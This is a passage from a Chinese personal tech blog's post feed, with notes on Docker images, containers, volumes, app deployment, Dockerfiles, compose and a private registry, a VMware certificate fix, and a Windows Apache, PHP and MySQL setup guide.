class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">redis</span> (:version)<br></code></pre></td></tr></table></figure><p>有时要到他的官方仓库找镜像 搜索命令不一定能看到你需要的版本</p></li><li><p>⭐容器：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">创建 docker run -i(保持运行) -t(分配终端接收命令) --name=first 镜像名(:version(有多个版本时)) <span class="hljs-regexp">/bin/</span>bash(进入容器 打开shell 可省略) <span class="hljs-keyword">exit</span>退出 容器关闭<br>     参数也能写作 -it(称作交互式容器) --name first<br>查看所有容器 docker ps -a (up正在运行 exited退出)<br>后台创建 docker run -id(守护式容器) --name=first 镜像名 <span class="hljs-regexp">/bin/</span>bash(不进入容器) 容器退出后不会关闭<br>进入 docker exec -it first <span class="hljs-regexp">/bin/</span>bash(不可省略) <br>启动(已经停止的容器) docker start 镜像id/镜像名<br>停止 docker stop 镜像名<br>查看 docker inspect 镜像名<br>删除 docker rm 容器id<br>docker rm `docker ps -a -q`(全删)<br></code></pre></td></tr></table></figure></li></ul><h2 id="四、数据卷"><a href="#四、数据卷" class="headerlink" title="四、数据卷"></a>四、数据卷</h2><p>问题：<br>1、Docker容器删除后 容器中产生的数据还有吗 没有</p><p>2、容器之间怎么数据交互</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210404155318730.png"></p><p><strong>物理机windows上vm搭建linux linux上使用Docker</strong><br>3、Docker容器与外部的物理机(注意物理机指windows)能直接交互文件吗 不能<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210404155426461.png"></p><ul><li><p>数据卷是linux的一个目录或文件 把容器装载到数据卷上(对方的修改都会立即同步）<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210404155501288.png"></p></li><li><p>一个数据卷可以装载多个容器</p></li></ul><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210404155156627.png"></p><ul><li><p>一个容器可以挂载多个数据卷<br><code>docker -it --name=first \</code><br><code>-v ../../...</code><br><code>-v ../../xxx</code></p></li><li><p><input checked="" disabled="" type="checkbox">  数据卷可以和物理机交换文件</p></li><li><p><input checked="" disabled="" type="checkbox">  容器间通过数据卷完成数据交互</p></li></ul><p>配置数据卷在创建容器时使用<code>-v ../../../xxx(绝对路径)</code></p><p>路径在linux的路径下设置</p><p>问题1：删除容器后Docker没有了产生的数据 但数据卷会保留容器产生的数据 扩展：恢复容器再次挂载数据卷 数据仍然可以使用</p><p>2：同一个数据卷的容器 在数据卷的内容相同 对数据卷的操作同时生效</p><h2 id="五、数据卷容器"><a href="#五、数据卷容器" class="headerlink" title="五、数据卷容器"></a>五、数据卷容器</h2><p>当多容器进行数据交换时 再使用同一个数据卷就不方便了 此时需要数据卷容器</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210404155917095.png"></p><p>此时相当于两个容器c1c2直接挂载到数据卷上 假如此时的C3坏了 c1c2与数据卷的联系也没有断</p><p>挂载步骤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">c3:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c3 -v **/volume(此目录不可改 由Docker分配)** 镜像名 <br><br>c1c2:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c1 --volumns-from c3 镜像名 <br><br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c2 --volumns-from c3 镜像名 <br></code></pre></td></tr></table></figure><h2 id="六、应用部署"><a href="#六、应用部署" class="headerlink" title="六、应用部署"></a>六、应用部署</h2><h3 id="Ⅰ、部署MySQL"><a href="#Ⅰ、部署MySQL" class="headerlink" title="Ⅰ、部署MySQL"></a>Ⅰ、部署MySQL</h3><ol><li>搜索mysql镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取mysql镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql:5.6<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建mysql目录用于存储mysql数据信息</span><br>mkdir ~/mysql<br>cd ~/mysql<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id \<br>-p 3307:3306 \<br>--name=c_mysql \<br>-v $PWD/conf:/etc/mysql/conf.d \<br>-v $PWD/logs:/logs \<br>-v $PWD/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>mysql:5.6<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。配置目录</li><li><strong>-v $PWD/logs:/logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 /logs。日志目录</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ：将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。数据目录</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456：</strong>初始化 root 用户的密码。</li></ul></li></ul><ol start="4"><li>进入容器，操作mysql</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec –it c_mysql /bin/bash<br></code></pre></td></tr></table></figure><ol start="5"><li>使用外部机器连接容器中的mysql</li></ol><h3 id="Ⅱ、部署Tomcat"><a href="#Ⅱ、部署Tomcat" class="headerlink" title="Ⅱ、部署Tomcat"></a>Ⅱ、部署Tomcat</h3><ol><li>搜索tomcat镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search tomcat<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取tomcat镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull tomcat<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建tomcat目录用于存储tomcat数据信息</span><br>mkdir ~/tomcat<br>cd ~/tomcat<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_tomcat \<br>-p 8080:8080 \<br>-v $PWD:/usr/local/tomcat/webapps \<br>tomcat <br></code></pre></td></tr></table></figure><ul><li><p>参数说明：</p><ul><li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p><p><strong>-v $PWD:/usr/local/tomcat/webapps：</strong>将主机中当前目录挂载到容器的webapps</p></li></ul></li></ul><ol start="4"><li>使用外部机器访问tomcat</li></ol><h3 id="Ⅲ、部署Nginx"><a href="#Ⅲ、部署Nginx" class="headerlink" title="Ⅲ、部署Nginx"></a>Ⅲ、部署Nginx</h3><ol><li>搜索nginx镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search nginx<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取nginx镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull nginx<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建nginx目录用于存储nginx数据信息</span><br>mkdir ~/nginx<br>cd ~/nginx<br>mkdir conf<br>cd conf<br><span class="hljs-meta">#</span><span class="bash"> 在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span><br>vim nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  nginx;<br>worker_processes  1;<br><br>error_log  /var/log/nginx/error.log warn;<br>pid        /var/run/nginx.pid;<br><br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br><br>http &#123;<br>    include       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br><br>    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;<br>                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;<br>                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;<br><br>    access_log  /var/log/nginx/access.log  main;<br><br>    sendfile        on;<br>    #tcp_nopush     on;<br><br>    keepalive_timeout  65;<br><br>    #gzip  on;<br><br>    include /etc/nginx/conf.d/*.conf;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_nginx \<br>-p 80:80 \<br>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \<br>-v $PWD/logs:/var/log/nginx \<br>-v $PWD/html:/usr/share/nginx/html \<br>nginx<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li><li><strong>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</strong>：将主机当前目录下的 /conf/nginx.conf 挂载到容器的 :/etc/nginx/nginx.conf。配置目录</li><li><strong>-v $PWD/logs:/var/log/nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的/var/log/nginx。日志目录</li></ul></li></ul><ol start="4"><li>使用外部机器访问nginx</li></ol><h3 id="Ⅳ、部署Redis"><a href="#Ⅳ、部署Redis" class="headerlink" title="Ⅳ、部署Redis"></a>Ⅳ、部署Redis</h3><ol><li>搜索redis镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search redis<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取redis镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull redis:5.0<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_redis -p 6379:6379 redis:5.0<br></code></pre></td></tr></table></figure><ol start="4"><li>使用外部机器连接redis</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./redis-cli.exe -h 192.168.149.135 -p 6379<br></code></pre></td></tr></table></figure><h2 id="七、镜像"><a href="#七、镜像" class="headerlink" title="七、镜像"></a>七、镜像</h2><p>为什么一个操作系统的镜像在Docker里会很小 因为使用了当前操作系统的bootfs 拉取下来的只是rootfs和往上的镜像层<br>又比如 tomcat的安装包比镜像小</p><p>linux(bootfs-&gt;rootfs)<br>本质：Docker的底端是bootfs而且是使用的是宿主机的内核 第二层是当前系统的rootfs的基础镜像base image 然后就有软件的编译环境如jdk 最后暴露在外面的就是软件的镜像 <strong>即分层文件系统</strong></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210408211917032.png"></p><p>对于使用者来说 就是集成了操作系统和编译运行环境的文件系统</p><h2 id="八、压缩文件"><a href="#八、压缩文件" class="headerlink" title="八、压缩文件"></a>八、压缩文件</h2><p>类似于操作系统中Ghost把分区克隆为.gho文件</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210418172617431.png"></p><ol><li>容器转为镜像<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker commit 容器<span class="hljs-built_in">id</span> 镜像名:版本号<br></code></pre></td></tr></table></figure>2.压缩镜像</li></ol><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">docker <span class="hljs-keyword">save</span> -o 压缩文件名 镜像名:版本号<br></code></pre></td></tr></table></figure><p>   3.解压出镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> 压缩文件名<br></code></pre></td></tr></table></figure><h2 id="九、Dockerfile"><a href="#九、Dockerfile" class="headerlink" title="九、Dockerfile"></a>九、Dockerfile</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210418172524845.png"></p><p>它是一个记录指令的文本文件 每一条指令构造一层基础镜像(开发) 最终构造成一个完整的发布镜像 这种做法和容器打包为压缩文件不一样 但最终效果一致 都能为开发人员提供一个完全一致的开发环境 有利于多方调试 对于测试人员则直接可以把其docker run 然后用于工作 对于运维人员则可以在应用部署时实现无缝衔接</p><p>据此，我们可以自定义一个软件(操作系统)安装后就有哪些功能(夹带哪些软件) FROM MAITAINER RUN WORKDIR</p><h3 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#案例 刚安装的centos终端输入vim发现不能使用 说明vim并没有被载入centos的镜像中 需要用户自行安装 那么我们可以自定义镜像</span><br><br>①定义父镜像 <span class="hljs-keyword">FROM</span> centos7<br>②定义作者信息 <span class="hljs-keyword">MAINTAINER</span> wo02ie<br>③执行安装软件的命令 <span class="hljs-keyword">RUN</span><span class="bash"> apt-get install vim</span><br><span class="hljs-comment">#还可使用离线安装包 ADD springboot.jar app.jar</span><br><span class="hljs-comment">#CMD jar -jar app.jar</span><br><br>④定义默认工作目录 <span class="hljs-keyword">WORKDIR</span><span class="bash">　／ｕｓｒ</span><br>⑤让容器启动执行命令　<span class="hljs-keyword">CMD</span><span class="bash">　（常是）／ｂｉｎ／ｂａｓｈ</span><br></code></pre></td></tr></table></figure><h3 id="使用Dockerfile文件"><a href="#使用Dockerfile文件" class="headerlink" title="使用Dockerfile文件"></a>使用Dockerfile文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker build -f ..<span class="hljs-regexp">/./</span>Dockerfile -t 镜像名 . <span class="hljs-comment">#这个点不能省略 将来工作寻址用</span><br></code></pre></td></tr></table></figure><p>使用dockerfile时 image里没有vim但要换apt-get源</p><p>在/etc/apt/</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">echo <span class="hljs-string">&quot;&quot;</span>&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful-security main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br><br><span class="hljs-meta">#这里不放其他的 都是网上找的 比较老的源 失效居多 自己再去找其他的源用吧</span><br></code></pre></td></tr></table></figure><p>除了上面这种方法 还有没有其他更简洁的方法呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;要修改的文件 比如sources.list <br>cat &lt;&lt; <span class="hljs-string">EOF &gt; sources.list</span><br><span class="hljs-string">然后就可以输入任何东西 还可以编辑</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span>回车结束<br></code></pre></td></tr></table></figure><h2 id="十、服务编排"><a href="#十、服务编排" class="headerlink" title="十、服务编排"></a>十、服务编排</h2><p>大量服务需要按照一定顺序启动 对服务进行批量管理 就需要使用服务编排</p><p>步骤如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>、同样 创建Dockerfile定义好服务环境<br><span class="hljs-number">2</span>、使用docker-compose.yml定义组成的各个服务<br><span class="hljs-number">3</span>、使用命令docker-compose <span class="hljs-keyword">up</span>启动应用<br></code></pre></td></tr></table></figure><ul><li>docker compose安装</li></ul><p>github上面的docker/compose/release 找到对应版本</p><p>使用curl -L <a href="https://github.com/docker/compose/release/download/xxx/docker-compose-">https://github.com/docker/compose/release/download/xxx/docker-compose-</a> `uname -s`-`uname -m` -o /usr/local/bin/docker-compose</p><p>chmod +X /usr/local/bin/docker-compose</p><p>docker-compose -version</p><ul><li><p>docker compose使用<br>进入docekr-compose文件下 编辑一个vim docker-compose.yml<br>编辑服务的一些配置服务<br><del>运维操作</del></p></li><li><p>启动一串服务<br>docker-compose up</p></li></ul><h2 id="十一、Docker私有仓库"><a href="#十一、Docker私有仓库" class="headerlink" title="十一、Docker私有仓库"></a>十一、Docker私有仓库</h2><p>类似于Github 但这主要用来保存镜像</p><p><strong>搭建步骤：</strong></p><ul><li><p>拉去私有仓库<br>docker pull registry</p></li><li><p>启动私有仓库<br>docekr run -id –name=registry -p 5000:5000 registry</p></li><li><p>访问私有仓库<br>http://本地私有仓库ip:5000/v2/_catalog</p></li></ul><p>访问到一个json字符串 说明搭建成功</p><ul><li>编辑加速器文件<br>将私有仓库添加到加速器vim /etc/docker/daemon.json</li></ul><p>追加：”insecure=registries”:[“本地仓库地址:5000”]</p><ul><li>重启docker服务<br>systemctl restart docker</li></ul><p><strong>上传镜像到私有仓库：</strong></p><ul><li><p>添加标记：<br>docker tag 本地镜像名 本地私有仓库ip:5000/镜像名</p></li><li><p>启动registry容器<br>docker start registry</p></li><li><p>上传<br>docker push 本地私有仓库/镜像名</p></li><li><p>从私有仓库拉取镜像<br>docker pull 本地私有仓库ip:5000/镜像名</p></li></ul><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>docker容器虚拟化与传统虚拟机比较</p><p>将软件和软件运行环境进行打包 便于开发交付部署</p><p>容器虚拟化的是操作系统/软件 虚拟机虚拟机化的是硬件</p><p>虚拟机可以运行不同的操作系统 容器只能寄生于一个操作系统</p><p><del>虚拟机已死 容器才是未来</del></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vm证书bug</title>
    <link href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/"/>
    <url>/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/</url>
    
    <content type="html"><![CDATA[<p>原因：VMware Authorization Service这个服务替换了本地根证书<br><img src="https://img-blog.csdnimg.cn/2021030518513134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>解决方案：<br>打开控制面板-管理工具-服务，设置VMware workstation server这个服务的启动类型为手动</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql+Apache+PHP</title>
    <link href="/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安装apache"><a href="#一、安装apache" class="headerlink" title="一、安装apache"></a>一、安装apache</h1><p>高版本不再提供msi安装 下载到的为压缩包方式 需要手动注册apache服务</p><ul><li>将apache解压至目标文件夹并配置<code>conf/httpd.conf</code>：<br><img src="https://img-blog.csdnimg.cn/20210126102746612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li><li>以管理员身份运行cmd，键入<code> .\..\Apache\bin&gt;httpd.exe -k install -n apache</code> 安装服务</li><li>键入<code>httpd.exe</code>即可启动服务</li><li>在浏览器中键入localhost:端口号<br>如下即apache安装成功<br><img src="https://img-blog.csdnimg.cn/202101271130525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h1 id="二、安装php"><a href="#二、安装php" class="headerlink" title="二、安装php"></a>二、安装php</h1><p>下载好php.zip解压至目标文件夹（注意：下载的php应该是有线程安全的版本）</p><p>写一个1.php（echo hello world）<br>cmd里键入<code>php.exe -f 1.php</code><br><img src="https://img-blog.csdnimg.cn/20210127113446262.png"><br>没问题php安装成功，接下来</p><h1 id="三、从apache加载php"><a href="#三、从apache加载php" class="headerlink" title="三、从apache加载php"></a>三、从apache加载php</h1><ul><li>打开php文件中的<code>php.ini-development</code>改名为<code>php.ini</code></li><li>修改<code>php.ini</code>的语句：<br>①去掉语句<code>;extension_dir=“ext”</code>分号（ini文件中;号为注释符）<br>②双引号内的<code>ext</code>更改为<code>php安装目录/ext</code></li><li>修改<code>apache/conf/httpd.conf</code> 在LoadModule代码区下方添加：<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> <span class="hljs-comment">#php安装路径/php7apache2_4.dll</span><br>LoadModule php_module <span class="hljs-string">&quot;php安装目录/php7apache2_4.dll&quot;</span> <br> <span class="hljs-comment">#php安装路径</span><br>PHPIniDir <span class="hljs-string">&quot;php安装目录&quot;</span> <br><span class="hljs-comment">#关联 *.php 文件</span><br>AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span><br></code></pre></td></tr></table></figure></li></ul><p>配置中使用<br><code>httpd.exe -t</code> 查看配置有无问题<br><code>htttp.exe -M</code> 查看加载的模块<br><img src="https://img-blog.csdnimg.cn/20210127134103576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>搭建时注意：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">一、apache和php的版本运行库要求一致 否则报错can<span class="hljs-symbol">&#x27;t</span> locate api module（原因未明）<br>二、apache和php配置文件中路径都使用/作为路径分隔符 不得使用\（会当成转义字符 引发报错）<br>三、从apache加载php模块时 注意代码注释不能置于语句后（tm就是个天坑 浪费老子时间）<br></code></pre></td></tr></table></figure><h1 id="四、安装mysql"><a href="#四、安装mysql" class="headerlink" title="四、安装mysql"></a>四、安装mysql</h1><p>可以使用离线安装版 这里熟悉环境的配置 提高难度<br>选择解压缩版：</p><ul><li><p>下载好mysql 解压缩至目标文件夹并创建<code>my.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment"># 设置mysql的安装目录，也就是刚才我们解压的目录</span><br><span class="hljs-attr">basedir</span>=D:/blog/mysql<br><span class="hljs-comment"># 设置mysql数据库的数据的存放目录</span><br><span class="hljs-attr">datadir</span>=D:/blog/mysql/data<br><span class="hljs-comment"># 设置默认使用的端口</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-comment"># 允许最大连接数</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span><br><span class="hljs-comment"># 允许连接失败的次数。这是为了防止有人试图攻击数据库</span><br><span class="hljs-attr">max_connect_errors</span>=<span class="hljs-number">10</span><br><span class="hljs-comment"># 服务端使用的字符集</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><span class="hljs-comment"># 数据库字符集对应一些排序等规则使用的字符集</span><br><span class="hljs-attr">collation-server</span>=utf8mb4_general_ci<br><span class="hljs-comment"># 创建新表时将使用的默认存储引擎</span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># 默认使用“mysql_native_password”插件作为认证加密方式</span><br><span class="hljs-comment"># MySQL8.0默认认证加密方式为caching_sha2_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br> <br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># 设置mysql客户端默认字符集</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br> <br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>① 以管理员的身份运行cmd：</p></li><li><p>初始化数据库<code>./../mysql/bin&gt;mysqld --initialize --console</code><br><img src="https://img-blog.csdnimg.cn/20210127213544982.png"> <strong>( root@localhost: fu8eu&gt;cGj8Cc )</strong></p></li><li><p>安装服务：<code>./../mysql/bin&gt;mysqld -install</code><br><img src="https://img-blog.csdnimg.cn/20210127213644968.png"></p></li><li><p>启动服务：<code>net start mysql或sc start mysql</code><br><img src="https://img-blog.csdnimg.cn/20210127214010779.png"></p></li><li><p>登录数据库：<code>mysql -u root -p</code>，输入复制的密码（手动输入）<img src="https://img-blog.csdnimg.cn/2021012721440381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p></li><li><p>马上更改密码:<code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;新密码&#39;;</code>（注意分号），提交：<code>commit;</code><br><img 